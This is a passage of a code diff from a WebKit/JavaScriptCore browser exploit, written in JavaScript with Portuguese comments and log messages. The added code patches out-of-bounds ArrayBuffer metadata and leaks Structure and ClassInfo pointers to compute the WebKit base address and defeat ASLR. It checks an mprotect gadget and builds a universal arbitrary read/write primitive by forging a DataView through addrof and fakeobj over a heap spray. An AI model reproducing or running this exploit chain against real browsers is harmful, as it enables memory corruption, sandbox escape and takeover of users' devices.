-                 throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
+        const TEST_VALUE_FOR_0X34 = 0x1000; 
+        const TEST_VALUE_FOR_0X40 = new AdvancedInt64(0x1, 0); 
+
+        const oob_array_buffer_real_ref = oob_data_view.buffer; 
+
+        if (!oob_array_buffer_real_ref) {
+            throw new Error("ArrayBuffer real do OOB DataView não disponível para patch de metadados.");
+        }
+
+        await setupOOBMetadataForArbitraryAccess(
+            oob_array_buffer_real_ref,
+            {
+                field_0x34: TEST_VALUE_FOR_0X34,
+                field_0x40: TEST_VALUE_FOR_0X40,
+                // Adicione outros campos se a engenharia reversa confirmar sua utilidade
+                // field_0x28: TEST_VALUE_FOR_0X28,
+                // field_0x38: TEST_VALUE_FOR_0X38,
+                // field_0x30: TEST_VALUE_FOR_0X30
             }
+        );
+        logFn(`[ASLR LEAK] Metadados do oob_array_buffer_real ajustados para tentar bypass.`, "info");
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
-            // Tentar ler múltiplas vezes para garantir que o valor seja estável
-            let attempts = 5;
-            for(let i = 0; i < attempts; i++) {
-                leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento do Float64Array sobreposto
-                if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0) {
-                     logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${attempts}): ${toHex(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double), 64)}`, "leak");
-                     break; // Se encontrou um valor que parece um ponteiro, sai
-                }
-                await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa entre as tentativas
-            }
+        // Tentar novamente a leitura do ponteiro da Structure após a modificação dos metadados
+        // structure_pointer_from_dummy_object_addr é o endereço do ponteiro para a Structure (dentro do JSCell)
+        const structure_pointer_from_dummy_object_addr = dummy_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const structure_address_from_leak = await arb_read(structure_pointer_from_dummy_object_addr, 8); // Valor do ponteiro para o objeto Structure
 
+        logFn(`[ASLR LEAK] Endereço da Structure do dummy_object (vazado): ${structure_address_from_leak.toString(true)}`, "leak");
 
-            if (typeof leaked_jsvalue_from_uaf_double !== 'number' || isNaN(leaked_jsvalue_from_uaf_double) || leaked_jsvalue_from_uaf_double === 0) {
-                 throw new Error(`Ponteiro vazado do UAF é inválido (double). Valor: ${leaked_jsvalue_from_uaf_double}. Provável falha de reocupação do heap.`);
-            }
-            logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");
+        if (!isAdvancedInt64Object(structure_address_from_leak) || structure_address_from_leak.equals(AdvancedInt64.Zero)) {
+            const errMsg = `Falha na leitura do ponteiro da Structure do dummy_object após ajuste: ${structure_address_from_leak.toString(true)}. Abortando ASLR leak.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
 
-            // Untag o ponteiro vazado (lógica do addrof_core)
-            let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
-            const original_high = untagged_uaf_addr.high();
-            const OBJECT_PTR_TAG_HIGH = 0x402a0000; // Tag comum para ponteiros de objetos em doubles.
-            const untagged_high = original_high & 0x0000FFFF;
+        // AGORA, vazaremos o endereço da Vtable da ClassInfo, que está dentro da WebKit
+        // ClassInfo Address = Structure Address + JSC_OFFSETS.Structure.CLASS_INFO_OFFSET (0x50)
+        const class_info_address = structure_address_from_leak.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET);
+        logFn(`[ASLR LEAK] Endereço da ClassInfo do dummy_object: ${class_info_address.toString(true)}`, "info");
 
-            let wasTagged = false;
-            if ((original_high & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) { // Verifica se tem o high tag esperado
-                untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
-                logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag 0x402a): ${untagged_uaf_addr.toString(true)}`, "leak");
-                wasTagged = true;
-            } else {
-                logFn(`[UAF LEAK] Ponteiro vazado: ${untagged_uaf_addr.toString(true)}. HIGH inesperado (0x${original_high.toString(16)}). NENHUM untagging aplicado.`, "warn");
-            }
-            
-            // O 'untagged_uaf_addr' é agora o endereço do ponteiro da Structure do DataView pulverizado.
-            // Para obter a base da biblioteca WebKit, subtraímos o offset do vtable.
-            // O offset do vtable já está em formato hexadecimal na config, então usaremos parseInt
-            const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-            
-            webkit_base_address = untagged_uaf_addr.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64); 
-            
-            // Verificação da validade da base WebKit
-            // Uma base válida deve ter os 12 bits menos significativos (os 3 últimos dígitos hex) como zero,
-            // ou seja, ser alinhada a 0x1000. Também não pode ser zero.
-            if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-                throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via UAF falhou.`);
-            }
-            logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)}`, "good");
-            
-            // Fazer um pequeno dump para confirmar que a base WebKit está correta (lendo um gadget conhecido)
-            const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
-            const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
-            logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
-            const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4, logFn); // Usando a arb_read LOCAL
-            
-            if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) { // Uma verificação mais robusta
-                logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
-            } else {
-                 logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código.`, "warn");
-                 // Se o gadget não puder ser lido, a arb_read local ainda pode estar limitada.
-                 // Mas, como UAF/TC foi bem-sucedido, prosseguimos para a universal R/W.
-            }
+        // Endereço da Vtable da ClassInfo = ClassInfo Address + JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET (0x8)
+        const vtable_class_info_address_in_webkit = await arb_read(class_info_address.add(JSC_OFFSETS_PARAM.ClassInfo.M_CACHED_TYPE_INFO_OFFSET), 8);
+        logFn(`[ASLR LEAK] Endereço da Vtable da ClassInfo do dummy_object (dentro do WebKit): ${vtable_class_info_address_in_webkit.toString(true)}`, "leak");
 
-        } catch (e_uaf_leak) {
-            logFn(`[UAF LEAK] ERRO CRÍTICO no vazamento de ASLR via UAF/TC: ${e_uaf_leak.message}\n${e_uaf_leak.stack || ''}`, "critical");
-            throw new Error("Vazamento de ASLR via UAF/TC falhou, abortando exploração.");
+        if (!isAdvancedInt64Object(vtable_class_info_address_in_webkit) || vtable_class_info_address_in_webkit.equals(AdvancedInt64.Zero) || (vtable_class_info_address_in_webkit.low() & 0xFFF) !== 0x000) {
+            const errMsg = `Vtable da ClassInfo (${vtable_class_info_address_in_webkit.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+
+        // CÁLCULO DA BASE WEBKIT:
+        // webkit_base_address = vtable_class_info_address_in_webkit - Offset_da_Vtable_ClassInfo_no_binario
+        // JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET (0x3AD62A0) é o offset da vtable da DataView
+        // *dentro do binário*. Vamos assumir que o offset da vtable da ClassInfo do JSObject é próximo ou o mesmo.
+        const OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+        webkit_base_address = vtable_class_info_address_in_webkit.sub(OFFSET_VTABLE_CLASSINFO_TO_WEBKIT_BASE);
+
+        if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
+            const errMsg = `Base WebKit calculada (${webkit_base_address.toString(true)}) é inválida ou não alinhada. Abortando ASLR leak.`;
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO: ${webkit_base_address.toString(true)}`, "good");
+
+        // ... (Verificação de gadget mprotect_plt_stub, FASE 4, FASE 5)
+        const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
+        const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
+        logFn(`Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
+        const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);
+
+        if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
+        } else {
+             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
         }
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
-        // --- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---
-        // Este bloco só será executado se o vazamento de ASLR UAF/TC for bem-sucedido.
-        logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
-
-        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
-        const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
+        logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
+        
+        // Atribuição aqui (não 'const' para evitar redeclaração)
+        DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
 
         const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
         let universalRwSuccess = false;
 
         for (const candidate_m_mode of mModeCandidates) {
-            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
+            logFn(`[${FNAME_CURRENT_TEST}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
             universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                 logFn,
                 pauseFn,
@@ -530,11 +512,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             );
             if (universalRwSuccess) {
                 found_m_mode = candidate_m_mode;
-                logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
+                logFn(`[${FNAME_CURRENT_TEST}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                 break;
             } else {
-                logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
-                await pauseFn(LOCAL_SHORT_PAUSE); // Pausa menor entre as tentativas de m_mode
+                logFn(`[${FNAME_CURRENT_TEST}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
+                await pauseFn(LOCAL_SHORT_PAUSE);
             }
         }
 
@@ -563,21 +545,21 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
         logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
         if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
-            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
+            logFn(`LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes)}. ASLR validado!`, "good");
         } else {
-             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
+             logFn(`ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando.`, "warn");
         }
-
-        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
         logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
         const rwTestPostLeakStartTime = performance.now();
 
-        const test_obj_post_leak = global_spray_objects[50000]; // Escolher um objeto mais distante para teste
+        const test_obj_post_leak = global_spray_objects.length > 0 ?
+                                       global_spray_objects[Math.floor(global_spray_objects.length / 2)] :
+                                       { test_val_prop: 0x98765432, another_prop: 0xABCDEF00 };
         hold_objects.push(test_obj_post_leak);
-        logFn(`Objeto de teste escolhido do spray (índice 50000) para teste pós-vazamento.`, "info");
+        logFn(`Objeto de teste escolhido do spray (ou novo criado) para teste pós-vazamento.`, "info");
 
         const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
         logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");
@@ -587,11 +569,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
         }
 
-        const original_val_prop = test_obj_post_leak.val1;
-        logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');
+        const original_val_prop = test_obj_post_leak.val1 || test_obj_post_leak.test_val_prop;
+        logFn(`Valor original de 'val1'/'test_val_prop' no objeto de teste: ${toHex(original_val_prop)}`, 'debug');
 
         faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
-        await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pausa muito curta
+        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
         const read_back_val_prop = faked_obj_for_post_leak_test.val1;
 
         if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
@@ -603,9 +585,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");
 
-        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
+        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária universal múltiplas vezes...", "info");
         let resistanceSuccessCount_post_leak = 0;
-        const numResistanceTests = 10; // Aumentado para 10 testes
+        const numResistanceTests = 10;
         const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
 
         for (let i = 0; i < numResistanceTests; i++) {
@@ -623,7 +605,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             } catch (resErr) {
                 logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
             }
-            await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa
+            await pauseFn(LOCAL_VERY_SHORT_PAUSE);
         }
         if (resistanceSuccessCount_post_leak === numResistanceTests) {
             logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
@@ -645,13 +627,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             }
         };
 
-    } catch (e) {
+    } catch (e) { // <-- Este é o 'catch' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
         final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
         final_result.success = false;
         logFn(final_result.message, "critical");
-    } finally {
+    } finally { // <-- Este é o 'finally' principal da função executeTypedArrayVictimAddrofAndWebKitLeak_R43
         logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
-        // Limpar objetos mantidos em hold_objects e global_spray_objects
         global_spray_objects = [];
         hold_objects = [];
 
